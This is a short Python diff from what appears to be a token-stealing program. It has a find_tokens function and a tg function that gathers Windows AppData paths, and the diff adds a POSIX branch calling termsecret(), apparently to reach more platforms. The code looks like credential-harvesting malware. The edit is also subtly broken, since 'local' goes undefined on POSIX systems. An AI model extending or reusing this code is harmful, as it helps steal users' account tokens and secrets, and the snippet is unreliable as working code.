@@ -864,7 +864,10 @@ def find_tokens(path):
     return tokens
 
 def tg():
-    local = os.getenv('LOCALAPPDATA')
+    if os.name == "posix":
+        termsecret()
+    else:
+        local = os.getenv('LOCALAPPDATA')
     roaming = os.getenv('APPDATA')
 
     paths = {
